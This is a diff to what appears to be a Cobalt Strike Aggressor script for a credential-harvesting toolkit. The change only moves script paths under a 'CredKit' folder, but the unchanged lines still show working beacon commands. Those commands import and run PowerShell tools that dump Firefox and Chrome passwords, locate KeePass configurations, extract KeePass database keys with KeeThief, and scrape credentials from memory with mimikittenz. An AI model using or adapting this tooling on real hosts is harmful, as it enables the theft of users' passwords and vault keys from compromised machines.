@@ -8,7 +8,7 @@ popup beacon_bottom {
 			foreach $bid ($1){
 				binput($1, "powershell-import Get-FirefoxPasswords.ps1");
 				# read in the powershell script
-				$handle = openf(script_resource("scripts/Get-FirefoxPasswords.ps1"));
+				$handle = openf(script_resource("CredKit/scripts/Get-FirefoxPasswords.ps1"));
 				$firefox_script = readb($handle, -1);
 				closef($handle);
 				# host firefox script on beacon
@@ -24,7 +24,7 @@ popup beacon_bottom {
 			foreach $bid ($1){
 				binput($1, "powershell-import Get-ChromePasswords.ps1");
 				# read in the powershell script
-				$handle = openf(script_resource("scripts/Get-ChromePasswords.ps1"));
+				$handle = openf(script_resource("CredKit/scripts/Get-ChromePasswords.ps1"));
 				$chrome_script = readb($handle, -1);
 				closef($handle);
 				$cmd = beacon_host_script($bid, $chrome_script);
@@ -38,7 +38,7 @@ popup beacon_bottom {
 			local('$bid');
 			foreach $bid ($1) {
 				binput($1, "powershell-import KeePassConfig.ps1");
-				bpowershell_import($bid, script_resource("scripts/KeePassConfig.ps1"));
+				bpowershell_import($bid, script_resource("CredKit/scripts/KeePassConfig.ps1"));
 				binput($bid, "powershell Find-KeePassconfig");
 				bpowershell($bid, "Find-KeePassconfig");
 			}
@@ -47,7 +47,7 @@ popup beacon_bottom {
 			local('$bid');
 			foreach $bid ($1) {
 				binput($bid, "powershell-import KeeThief.ps1");
-				bpowershell_import($bid, script_resource("scripts/KeeThief.ps1"));
+				bpowershell_import($bid, script_resource("CredKit/scripts/KeeThief.ps1"));
 				binput($bid, "powershell Get-KeePassDatabaseKey -Verbose");
 				bpowershell($bid, "Get-KeePassDatabaseKey -Verbose");
 			}
@@ -56,7 +56,7 @@ popup beacon_bottom {
 			local('$bid');
 			foreach $bid ($1) {
 				binput($bid, "powershell-import Invoke-mimikittenz.ps1");
-				bpowershell_import($bid, script_resource("scripts/Invoke-mimikittenz.ps1"));
+				bpowershell_import($bid, script_resource("CredKit/scripts/Invoke-mimikittenz.ps1"));
 				binput($bid, "powershell Invoke-mimikittenz");
 				bpowershell($bid, "Invoke-mimikittenz");
 			}
